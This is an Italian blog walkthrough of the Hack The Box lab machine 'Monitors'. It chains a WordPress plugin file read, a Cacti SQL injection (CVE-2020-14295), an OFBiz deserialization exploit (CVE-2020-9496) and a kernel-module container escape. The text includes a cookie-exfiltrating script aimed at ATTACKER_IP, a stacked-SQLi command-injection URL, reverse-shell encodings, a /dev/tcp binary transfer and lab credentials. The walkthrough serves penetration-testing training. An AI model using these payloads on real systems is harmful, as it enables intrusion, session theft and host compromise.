---
title: 'HTB Monitors Walkthrough: Cacti SQLi e Container Escape'
slug: htb-monitors-walkthrough
description: 'Walkthrough di Hack The Box Monitors: SQLi in Cacti (CVE-2020-14295), deserializzazione in OFBiz (CVE-2020-9496) e container escape via kernel module.'
image: /htb-monitors-walkthrough.webp
draft: false
date: 2026-09-11T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - hard
tags:
  - hackthebox
  - container-escape
  - deserializzazione
---

# HTB Monitors: da LFI su WordPress a Root via Container Escape

Monitors è una macchina Linux "Hard" di Hack The Box che incatena diverse vulnerabilità: un endpoint vulnerabile su un plugin WordPress obsoleto che espone sia lettura file arbitraria che riflessione di contenuto sfruttabile via XSS, una SQL Injection in Cacti che porta a RCE, una deserializzazione Java non autenticata in Apache OFBiz dentro un container Docker, e infine un container escape sfruttando la capability `CAP_SYS_MODULE` per caricare un modulo kernel malevolo sull'host.

## Recon iniziale

Una scansione completa delle porte con [mynmap](https://github.com/hack-ita/mynmap), il wrapper nmap di Hackita che automatizza scan iniziale + script/version detection in un unico passaggio, mostra solo due porte esposte:

```
sudo mynmap monitors.htb
```

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

Le versioni di OpenSSH e Apache sono coerenti con un Ubuntu 18.04 Bionic. Visitando l'IP diretto, Apache restituisce un 403 con un messaggio che invita esplicitamente a usare un hostname — segno che il server risponde solo in base all'header `Host`, quindi la macchina ospita virtual host multipli.

Aggiungendo `monitors.htb` all'`/etc/hosts` si accede a un blog WordPress dedicato all'hardware monitoring, con copyright del 2018: un primo indizio, insieme alla data, che il sito potrebbe girare su plugin datati e non aggiornati.

## Shell come www-data

### Enumerazione WordPress con WPScan

Un'enumerazione con [WPScan](https://hackita.it/articoli/wpscan/) (`wpscan --url http://monitors.htb/ -e ap,t,tt,u`) restituisce diverse vulnerabilità nel core di WordPress 5.5.1, nessuna direttamente sfruttabile per RCE, ma identifica anche un plugin installato: **wp-with-spritz**, versione 1.0, non aggiornato dal 2015.

### Il plugin wp-with-spritz: lettura file, non esecuzione

Il plugin espone un endpoint che passa un parametro controllato dall'utente direttamente a `file_get_contents()`, senza alcuna validazione:

```php
if(isset($_GET['url'])){
$content = file_get_contents($_GET['url']);
```

Il punto tecnico da capire qui è la differenza tra `file_get_contents()` e costrutti come `include`/`require`: la prima funzione **legge** il contenuto di un file o di una risorsa remota e lo restituisce come stringa — non lo esegue, qualunque sia il contenuto. Se si prova a puntare `url` verso uno script PHP remoto, quel PHP viene scaricato come testo grezzo, non interpretato dal motore PHP del server. Questo esclude una Remote File Inclusion classica con esecuzione di codice: anche riuscendo a far scaricare un file PHP malevolo, il server non lo eseguirà mai tramite questo endpoint.

Quello che invece l'endpoint permette sono due vettori distinti, a seconda di cosa gli si passa in `url`:

**1. Path Traversal / lettura file locale.** Passando un path locale con traversal, `file_get_contents()` legge file arbitrari sul filesystem:

```
GET /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
```

**2. SSRF con riflessione del contenuto.** Passando un URL remoto, il plugin effettua una richiesta HTTP server-side verso quell'URL e ne riflette il contenuto nella risposta al browser — questa è una Server-Side Request Forgery. Ma poiché il contenuto scaricato viene poi stampato nella pagina e interpretato dal browser come HTML, se il contenuto remoto contiene `<script>` questo **viene eseguito lato client**: il vettore SSRF diventa quindi anche un veicolo per una Reflected XSS, con il server target che agisce da proxy tra l'attaccante e la vittima che clicca il link.

Sfruttando questo secondo vettore è possibile costruire un payload che, una volta eseguito nel browser di un utente autenticato (es. admin), esfiltra il cookie di sessione tramite una richiesta d'immagine verso un server controllato dall'attaccante:

```javascript
new Image().src = "http://ATTACKER_IP/steal?c=" + document.cookie;
```

Questa tecnica va oltre lo scope stretto della RCE ottenuta poi su Cacti, ma vale la pena notarla perché lo stesso endpoint vulnerabile espone contemporaneamente due classi di vulnerabilità diverse (lettura file e SSRF/XSS) — è un buon promemoria di quanto sia importante testare un singolo parametro controllato con angolazioni diverse, non fermarsi al primo impatto trovato.

### Enumerazione dei virtual host

Con accesso in lettura al filesystem tramite il path traversal, la configurazione Apache in `/etc/apache2/sites-enabled/000-default.conf` rivela in un commento l'esistenza di altri due file vhost non ancora noti: `monitors.htb.conf` e `cacti-admin.monitors.htb.conf`. Quest'ultimo espone un'installazione di **Cacti** — un tool open source di network graphing e monitoring — con document root su `/usr/share/cacti`.

Recuperando `wp-config.php` (`url=/../../../../var/www/wordpress/wp-config.php`) si ottengono le credenziali del database WordPress:

```
DB_USER: wpadmin
DB_PASSWORD: BestAdministrator@2020!
```

Queste credenziali non funzionano né su WordPress né su SSH, ma sono riutilizzate identiche come credenziali admin sul pannello Cacti — un classico caso di password reuse tra servizi diversi sulla stessa infrastruttura, un pattern da controllare sempre durante l'enumerazione.

### SQL Injection in Cacti — CVE-2020-14295

Cacti 1.2.12 è vulnerabile a [SQL Injection](https://hackita.it/articoli/sql-injection/) non autenticata, tracciata come **CVE-2020-14295**, nel parametro `filter` dell'endpoint `color.php`. La vulnerabilità è documentata in una issue pubblica sul repository GitHub del progetto, dove un membro della community mostra sia la SQLi pura che, in un commento successivo, il modo per trasformarla in esecuzione di comandi arbitrari.

Analizzando quella discussione, il punto chiave è che `color.php` non sanitizza correttamente il parametro `filter` prima di usarlo in una query — permettendo di chiudere la stringa originale con `')` e concatenare una `UNION SELECT` che pesca dalla tabella `user_auth` (username/password hash degli utenti Cacti). Ma la parte più interessante emersa dalla discussione è che il database MySQL, con `multiple statements` abilitato lato applicativo, permette anche di **stackare** una seconda query dopo un punto e virgola nella stessa richiesta. Questo apre la strada a un `UPDATE` sulla tabella `settings`, che modifica la colonna `path_php_binary` — il path del binario PHP che Cacti invoca internamente per alcune operazioni pianificate — sostituendolo con un comando shell arbitrario:

```
/cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='COMANDO;'+where+name='path_php_binary';--+-
```

Il comando iniettato non viene eseguito immediatamente: viene effettivamente invocato solo visitando `host.php?action=reindex`, che internamente richiama il binario configurato in `path_php_binary`. Una particolarità non ovvia, riscontrabile solo testando: il binario aggiornato nel database viene rieseguito una sola volta per sessione autenticata — se si prova a rilanciare `host.php` una seconda volta nella stessa sessione, viene eseguito ancora il comando precedente, non quello nuovo. Per ogni comando serve quindi una sessione pulita: login, injection e trigger vanno rifatti da capo ogni volta.

Automatizzare l'intero flusso con uno script che gestisce token CSRF, login, injection e trigger in sequenza rende il processo affidabile e ripetibile, invece di doverlo fare manualmente via browser o Burp Repeater ogni volta.

Con questa tecnica, prima verificata con un comando innocuo come `ping` (per confermare la RCE via ICMP su tcpdump) e poi con una reverse shell Bash, si ottiene shell come **www-data**.

## Shell come marcus

### Il servizio cacti-backup

Enumerando `/etc/systemd/system` — il percorso dove Linux mantiene le unit file dei servizi systemd, inclusi quelli custom installati sulla macchina oltre a quelli di sistema — si trova un servizio non standard:

```ini
[Unit]
Description=Cacti Backup Service

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh
```

Il servizio gira come www-data (quindi non offre privesc diretta, dato che siamo già quell'utente), ma rivela il path di uno script leggibile grazie ai permessi della directory. `backup.sh` contiene una password in chiaro, usata per autenticare un `scp` verso un altro host della rete tramite `sshpass`:

```bash
config_pass="VerticalEdge2020"
sshpass -p "${config_pass}" scp /tmp/cacti_backup 192.168.1.14:/opt/backup_collection/cacti_backup.zip
```

Credenziali hardcoded in script di automazione sono un errore di configurazione comune e, come in questo caso, spesso riutilizzate anche per account utente reali sulla stessa macchina. La password `VerticalEdge2020` funziona infatti per l'utente `marcus`, sia via `su marcus` sia via SSH, permettendo di leggere `user.txt`.

## Shell come root nel container — CVE-2020-9496

### Identificazione del container OFBiz

Nella home di marcus, un `note.txt` con una todo list accenna a un'immagine Docker "non pronta per produzione". La lista processi conferma la presenza di un `docker-proxy` che inoltra il traffico da `127.0.0.1:8443` verso l'IP interno di un container (`172.17.0.2:8443`) — porta non esposta esternamente, quindi raggiungibile solo dalla macchina stessa.

Con un port forward SSH (`ssh marcus@target -L 8443:localhost:8443`) è possibile inoltrare quella porta interna fino alla propria macchina di attacco e raggiungere il servizio. Visitando l'endpoint via browser o curl, il server risponde con un 404 di Tomcat che rivela la versione: **Apache Tomcat 9.0.31**. Un'enumerazione più approfondita delle directory rivela che dietro Tomcat gira **Apache OFBiz, release 17.12.01** — un ERP/framework applicativo enterprise open source, visibile dal footer delle pagine di login.

### Deserializzazione XML-RPC — CVE-2020-9496

OFBiz 17.12.01 è vulnerabile a [deserializzazione Java](https://hackita.it/articoli/deserialization-attack/) non autenticata nell'endpoint `/webtools/control/xmlrpc`, tracciata come **CVE-2020-9496** e documentata in dettaglio dalla Zero Day Initiative. Il bug risiede nel parsing del protocollo XML-RPC: un tag `<serializable>` non standard, aggiunto come estensione da Apache, permette di inserire un oggetto Java serializzato in base64 dentro il corpo della richiesta XML. Il server lo deserializza senza alcuna validazione, aprendo la strada a una catena di [RCE](https://hackita.it/articoli/rce/) tramite gadget chain.

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>test</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">BASE64_GADGET</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```

Il payload va generato con **ysoserial**, provando diverse gadget chain finché una non trova una classe compatibile nel classpath del target: le famiglie `CommonsCollections` non funzionano su questa versione, mentre `CommonsBeanutils1` sì.

Un dettaglio pratico importante riguarda come il gadget esegue il comando: passa per `Runtime.exec(String)`, che non invoca una shell — esegue solo un binario seguito dai suoi argomenti, senza interpretare `;`, `&&`, `|`, redirect o altre sintassi di shell. Comandi semplici come `ping` funzionano, ma reverse shell classiche con pipe e redirect no.

La soluzione robusta è incapsulare tutto in un singolo comando `bash -c`, usando sintassi ad array e passando il comando reale codificato in base64:

```
bash -c {echo,BASE64_DEL_COMANDO}|{base64,-d}|{bash,-i}
```

Questa forma evita del tutto il problema di spazi e caratteri speciali nella command line passata al gadget: `Runtime.exec()` vede un solo comando (`bash`) con argomenti (`-c`, `{echo,...}|{base64,-d}|{bash,-i}`), e bash internamente interpreta correttamente l'array e le pipe. Il risultato è una reverse shell come **root**, ma confinata dentro il container Docker.

### Trasferire ligolo-agent senza curl

Una volta dentro il container come root, per raggiungere agevolmente altri servizi interni serve un tunnel — ma il container non ha `curl` né `wget` installati. In questi casi, se è presente `bash`, si può trasferire un binario sfruttando `/dev/tcp`, la pseudo-device interface che bash usa per aprire connessioni TCP grezze trattandole come file.

Lato attaccante, si serve il binario `ligolo-agent` su una porta in ascolto con netcat:

```bash
nc -lvnp 9001 < ligolo-agent
```

Lato target (dentro il container), si legge dalla connessione TCP e si scrive il contenuto ricevuto su un file locale:

```bash
cat - < /dev/tcp/10.10.14.198/80 > ligolo-agent
```

Il binario viaggia byte per byte sulla connessione raw, senza passare da alcun tool HTTP: è la tecnica da usare ogni volta che manca sia `curl` sia `wget` ma è disponibile una shell bash.

## Container escape

La privilege escalation da root-nel-container a root-sull'host è stata condotta seguendo la stessa metodologia descritta nell'articolo Hackita su [container escape](https://hackita.it/articoli/container-escape/), che copre proprio lo scenario di una webapp in un Docker privilegiato.

### Enumerazione delle capability

Dentro il container, `cat /proc/self/status | grep Cap` (o in alternativa `capsh --print`, se disponibile) rivela le capability Linux attive per il processo corrente. La presenza di `CAP_SYS_MODULE` nel bounding set indica che il container è stato avviato in modalità `--privileged` — configurazione che concede capability estese, incluse `CAP_SYS_MODULE` (caricamento moduli kernel), `CAP_SYS_RAWIO` e `CAP_SYS_ADMIN`.

`CAP_SYS_MODULE` è particolarmente critica: permette di caricare moduli kernel con `insmod`, e poiché il kernel Linux è condiviso tra host e container (a differenza del filesystem, che è isolato), un modulo caricato dall'interno del container viene eseguito con i privilegi del kernel host, non del container.

### Compilazione ed esecuzione del modulo kernel

Il modulo va compilato nello stesso identico ambiente headers del kernel target, disponibile in `/usr/src/linux-headers-$(uname -r)` — nel container sono di solito già installati, dato che servono per buildare i moduli usati dall'applicazione stessa. Servono due file: il sorgente C del modulo malevolo e un Makefile minimale.

```makefile
obj-m += escape.o
```

```
make -C /lib/modules/$(uname -r)/build M=/tmp/privesc modules
```

Il modulo, scritto in C usando le API del kernel Linux, esegue una reverse shell al momento del caricamento tramite `call_usermodehelper()` — una funzione kernel pensata per lanciare processi userspace da contesto kernel, qui usata per eseguire `/bin/bash` con i privilegi massimi disponibili.

```
insmod escape.ko
```

Il caricamento del modulo apre una reverse shell come **root sull'host**, non più confinata nel container, completando la catena di attacco fino a `root.txt`.

## Lezioni chiave

* **Password reuse** tra servizi diversi (WordPress → Cacti, script di backup → account utente) è spesso la chiave per il movimento laterale iniziale: ogni credenziale trovata va sempre testata su tutti i servizi disponibili.
* Un singolo parametro controllato dall'utente può nascondere più vulnerabilità diverse (path traversal e SSRF/XSS nello stesso endpoint): vale sempre la pena testarlo con angolazioni multiple, non fermarsi al primo impatto confermato.
* Le vulnerabilità di deserializzazione Java richiedono attenzione a come il gadget invoca l'esecuzione: `Runtime.exec(String)` non passa per una shell, quindi comandi complessi vanno sempre incapsulati in un unico binario (`bash -c` con array) per evitare la rottura della sintassi.
* Un container Docker eseguito con `--privileged` e `CAP_SYS_MODULE` attivo equivale, di fatto, a root sull'host tramite kernel module loading: la capability va sempre verificata (`/proc/self/status`, `capsh --print`) quando si atterra dentro un container durante un penetration test.
